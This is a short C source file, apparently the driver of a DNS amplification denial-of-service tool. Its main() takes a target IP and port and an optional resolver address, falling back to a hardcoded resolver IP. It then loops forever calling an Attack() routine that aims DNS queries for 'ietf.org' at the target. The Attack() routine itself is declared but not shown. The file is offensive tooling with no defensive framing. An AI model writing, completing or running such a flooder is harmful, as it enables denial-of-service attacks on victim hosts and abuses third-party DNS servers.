#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>

void Attack(char *, int, char*, int, unsigned char *);

int main(int argc, char **argv){
	if(argc < 3){
		printf("Wrong number of options \n"
		 	   "Example \n"
		 	   "  dns targetip targetport [dnsip]\n\n");

		return -1;
	}

	char *targetip = argv[1];
	int targetport = atoi(argv[2]);
	char *dnsip;

	if(argc == 4)
		dnsip = argv[3];
	else
		dnsip = "208.80.184.69";

	while(1){
		Attack(targetip, targetport, dnsip, 53, "ietf.org");
	}

	return 0;
}